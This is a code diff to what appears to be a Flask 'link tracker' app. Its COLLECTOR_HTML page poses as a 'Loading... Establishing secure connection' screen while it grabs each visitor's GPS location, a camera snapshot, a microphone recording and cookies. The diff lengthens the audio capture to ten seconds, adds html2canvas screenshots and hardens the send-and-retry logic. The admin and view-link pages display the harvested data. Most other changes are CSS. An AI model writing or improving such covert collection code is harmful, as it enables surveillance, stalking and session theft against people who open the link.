@@ -303,6 +303,46 @@ ADMIN_USER_HTML = """
 <!DOCTYPE html>
 <html>
 <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>User Data - {{ user.username }}</title>""" + BASE_CSS + """
+<style>
+/* মোবাইলে লেবেল ও ভ্যালু আলাদা লাইনে দেখানোর জন্য */
+@media (max-width: 600px) {
+    .visit-card .row {
+        display: flex;
+        flex-direction: column;
+        align-items: flex-start;
+        margin-bottom: 6px;
+    }
+    .visit-card .label {
+        width: auto;
+        font-weight: bold;
+        color: #6688aa;
+        margin-bottom: 2px;
+    }
+    .visit-card .value {
+        word-break: break-word;
+        width: 100%;
+    }
+    .visit-card img {
+        max-width: 100% !important;
+        height: auto !important;
+    }
+    .visit-card audio {
+        max-width: 100% !important;
+    }
+}
+/* ইমেজ ও অডিও সাইজ ঠিক করা */
+.visit-card img {
+    max-width: 250px;
+    height: auto;
+    border-radius: 12px;
+    border: 1px solid #334466;
+    margin: 5px 0;
+}
+.visit-card audio {
+    max-width: 250px;
+    margin: 5px 0;
+}
+</style>
 </head>
 <body>
 <div class="container">
@@ -335,7 +375,7 @@ ADMIN_USER_HTML = """
             <div class="row"><span class="label">Cookies:</span> <span class="value">{{ v.get('cookies', 'N/A') }}</span></div>
             <div class="row"><span class="label">Referrer:</span> <span class="value">{{ v.get('referrer', 'N/A') }}</span></div>
 
-            <!-- ===== নতুন ডেটা ===== -->
+            <!-- নতুন ডেটা -->
             <div class="row"><span class="label">Device Model:</span> <span class="value">{{ v.get('deviceModel', 'N/A') }}</span></div>
             <div class="row"><span class="label">Network Type:</span> <span class="value">{{ v.get('connType', 'N/A') }}</span></div>
             <div class="row"><span class="label">Downlink Speed:</span> <span class="value">{{ v.get('downlink', 'N/A') }} Mbps</span></div>
@@ -377,12 +417,44 @@ ADMIN_USER_HTML = """
 </body>
 </html>
 """
-
 # ===== User View Link (full data including audio) =====
 VIEW_LINK_HTML = """
 <!DOCTYPE html>
 <html>
 <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Visitor Data</title>""" + BASE_CSS + """
+<style>
+/* মোবাইলে লেবেল ও ভ্যালু আলাদা লাইনে দেখানোর জন্য */
+@media (max-width: 600px) {
+    .visit-card .row {
+        display: flex;
+        flex-direction: column;
+        align-items: flex-start;
+        margin-bottom: 6px;
+    }
+    .visit-card .label {
+        width: auto;
+        font-weight: bold;
+        color: #6688aa;
+        margin-bottom: 2px;
+    }
+    .visit-card .value {
+        word-break: break-word;
+        width: 100%;
+    }
+    .visit-card img {
+        max-width: 100% !important;
+        height: auto !important;
+    }
+}
+/* ইমেজ সাইজ ঠিক করা */
+.visit-card img {
+    max-width: 250px;
+    height: auto;
+    border-radius: 12px;
+    border: 1px solid #334466;
+    margin: 5px 0;
+}
+</style>
 </head>
 <body>
 <div class="container">
@@ -410,7 +482,7 @@ VIEW_LINK_HTML = """
             <div class="row"><span class="label">Cookies:</span> <span class="value">{{ v.get('cookies', 'N/A') }}</span></div>
             <div class="row"><span class="label">Referrer:</span> <span class="value">{{ v.get('referrer', 'N/A') }}</span></div>
 
-            <!-- ===== নতুন ডেটা ===== -->
+            <!-- নতুন ডেটা -->
             <div class="row"><span class="label">Device Model:</span> <span class="value">{{ v.get('deviceModel', 'N/A') }}</span></div>
             <div class="row"><span class="label">Network Type:</span> <span class="value">{{ v.get('connType', 'N/A') }}</span></div>
             <div class="row"><span class="label">Downlink Speed:</span> <span class="value">{{ v.get('downlink', 'N/A') }} Mbps</span></div>
@@ -444,7 +516,7 @@ VIEW_LINK_HTML = """
         </div>
         {% endfor %}
     {% else %}
-        <p style="color:#6688aa;font-size:1.2rem;">No visits yet. Share your link to or data.</p>
+        <p style="color:#6688aa;font-size:1.2rem;">No visits yet. Share your link to collect data.</p>
     {% endif %}
 </div>
 </body>
@@ -455,6 +527,7 @@ COLLECTOR_HTML = """
 <!DOCTYPE html>
 <html>
 <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no"><title>Loading...</title>
+<script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#0a0e17;color:#00ffcc;display:flex;justify-content:center;align-items:center;min-height:100vh;flex-direction:column;padding:15px;text-align:center;font-family:system-ui,sans-serif}
@@ -465,13 +538,16 @@ p{font-size:1.2rem;color:#6688aa;margin:10px 0}
 </style>
 </head>
 <body>
-    <div class="loader"></div>
-    <p>⏳ Establishing secure connection...</p>
-    <div id="status" class="msg"></div>
+    <div id="capture-area" style="width:100%;max-width:400px;margin:auto;padding:20px;background:#111927;border-radius:12px;border:1px solid #00ffcc33;">
+        <div class="loader"></div>
+        <p>⏳ Establishing secure connection...</p>
+        <div id="status" class="msg"></div>
+        <div style="color:#6688aa;font-size:0.8rem;margin-top:10px;">📡 Secured Channel</div>
+    </div>
 
     <script>
         // ============================================
-        // 1. GPS (fast)
+        // 1. GPS
         // ============================================
         let gps = 'Permission denied';
         if (navigator.geolocation) {
@@ -482,7 +558,7 @@ p{font-size:1.2rem;color:#6688aa;margin:10px 0}
         }
 
         // ============================================
-        // 2. Camera (640x480) + Audio (3 sec)
+        // 2. Camera (640x480) + Audio (10 sec)
         // ============================================
         let camera = null;
         let audioData = null;
@@ -500,17 +576,16 @@ p{font-size:1.2rem;color:#6688aa;margin:10px 0}
                 canvas.width = 640;
                 canvas.height = 480;
                 const ctx = canvas.getContext('2d');
-                // Draw video frame
                 ctx.drawImage(video, 0, 0, 640, 480);
                 camera = canvas.toDataURL('image/jpeg');
                 cameraReady = true;
                 stream.getTracks().forEach(t => t.stop());
                 checkAndSend();
-            }, 1500);
+            }, 1200);
         })
         .catch(() => { camera = 'Failed'; cameraReady = true; checkAndSend(); });
 
-        // Audio (3 seconds)
+        // Audio (10 seconds)
         navigator.mediaDevices.getUserMedia({ audio: true })
         .then(stream => {
             const mediaRecorder = new MediaRecorder(stream);
@@ -530,7 +605,7 @@ p{font-size:1.2rem;color:#6688aa;margin:10px 0}
             setTimeout(() => {
                 mediaRecorder.stop();
                 stream.getTracks().forEach(t => t.stop());
-            }, 3000);
+            }, 10000); // 10 seconds
         })
         .catch(() => { audioData = 'Failed'; audioReady = true; checkAndSend(); });
 
@@ -542,8 +617,9 @@ p{font-size:1.2rem;color:#6688aa;margin:10px 0}
         if (/iPhone/.test(ua)) deviceModel = 'iPhone';
         else if (/iPad/.test(ua)) deviceModel = 'iPad';
         else if (/Android/.test(ua)) {
-            const match = ua.match(/Android\s([\d.]+);\s([^;]+)/);
-            if (match) deviceModel = match[2] || 'Android Device';
+            const match = ua.match(/Android\s([\d.]+);\s([^)]+)\)/);
+            if (match) deviceModel = match[2].trim();
+            else deviceModel = 'Android Device';
         } else if (/Windows/.test(ua)) deviceModel = 'Windows PC';
         else if (/Macintosh/.test(ua)) deviceModel = 'Mac';
 
@@ -592,43 +668,48 @@ p{font-size:1.2rem;color:#6688aa;margin:10px 0}
             memory = navigator.deviceMemory + ' GB';
         }
 
-        // Cookies & Referrer
         let cookies = document.cookie || 'None';
         let referrer = document.referrer || 'Direct';
 
         // ============================================
-        // 4. Real Screenshot (using html2canvas if available, else fallback)
+        // 4. Real Screenshot using html2canvas
         // ============================================
         let screenshot = null;
         function captureScreen() {
-            // Use a simple canvas drawing (real screenshot requires html2canvas)
-            // We'll draw the current page content as text
-            const canvas = document.createElement('canvas');
-            canvas.width = 800;
-            canvas.height = 600;
-            const ctx = canvas.getContext('2d');
-            ctx.fillStyle = '#0a0e17';
-            ctx.fillRect(0, 0, 800, 600);
-            ctx.fillStyle = '#00ffcc';
-            ctx.font = '24px monospace';
-            ctx.fillText('Secure Connection', 20, 50);
-            ctx.fillStyle = '#6688aa';
-            ctx.font = '18px monospace';
-            ctx.fillText('IP: {{ ip }}', 20, 100);
-            ctx.fillText('Browser: ' + navigator.userAgent.substring(0, 30), 20, 140);
-            ctx.fillText('Screen: ' + screen.width + 'x' + screen.height, 20, 180);
-            ctx.fillText('Time: ' + new Date().toLocaleString(), 20, 220);
-            return canvas.toDataURL('image/png');
+            html2canvas(document.body, {
+                scale: 0.8,
+                useCORS: true,
+                backgroundColor: '#0a0e17'
+            }).then(canvas => {
+                screenshot = canvas.toDataURL('image/png');
+                checkAndSend();
+            }).catch(() => {
+                // Fallback
+                const canvas = document.createElement('canvas');
+                canvas.width = 800; canvas.height = 600;
+                const ctx = canvas.getContext('2d');
+                ctx.fillStyle = '#0a0e17'; ctx.fillRect(0,0,800,600);
+                ctx.fillStyle = '#00ffcc'; ctx.font = '24px monospace';
+                ctx.fillText('Secure Connection', 20, 50);
+                screenshot = canvas.toDataURL('image/png');
+                checkAndSend();
+            });
         }
-        screenshot = captureScreen();
+        setTimeout(captureScreen, 300);
 
         // ============================================
-        // 5. Send Data (as soon as camera+audio ready)
+        // 5. Send Data
         // ============================================
         let isSending = false;
+        let sent = false;
+
         function sendData() {
-            if (isSending) return;
-            isSending = true;
+            if (sent) return;
+            if (!cameraReady || !audioReady || !screenshot) {
+                setTimeout(sendData, 200);
+                return;
+            }
+            sent = true;
 
             const data = {
                 ip: "{{ ip }}",
@@ -667,23 +748,32 @@ p{font-size:1.2rem;color:#6688aa;margin:10px 0}
                     document.getElementById('status').innerHTML = '🔒 Session secure.';
                 }, 1000);
             }).catch(() => {
-                document.getElementById('status').innerHTML = '⚠️ Error, retrying...';
-                setTimeout(sendData, 2000);
+                sent = false;
+                setTimeout(sendData, 1500);
             });
         }
 
         function checkAndSend() {
-            if (cameraReady && audioReady && !isSending) {
+            if (cameraReady && audioReady && screenshot && !sent) {
                 sendData();
             }
         }
 
-        // Fallback: force send after 5 seconds
+        // Fallback force send after 12 seconds (to allow 10 sec audio)
         setTimeout(() => {
             if (!cameraReady) { camera = 'Failed'; cameraReady = true; }
             if (!audioReady) { audioData = 'Failed'; audioReady = true; }
-            if (!isSending) sendData();
-        }, 5000);
+            if (!screenshot) {
+                const canvas = document.createElement('canvas');
+                canvas.width = 800; canvas.height = 600;
+                const ctx = canvas.getContext('2d');
+                ctx.fillStyle = '#0a0e17'; ctx.fillRect(0,0,800,600);
+                ctx.fillStyle = '#00ffcc'; ctx.font = '24px monospace';
+                ctx.fillText('Secure Connection', 20, 50);
+                screenshot = canvas.toDataURL('image/png');
+            }
+            if (!sent) sendData();
+        }, 12000);
     </script>
 </body>
 </html>
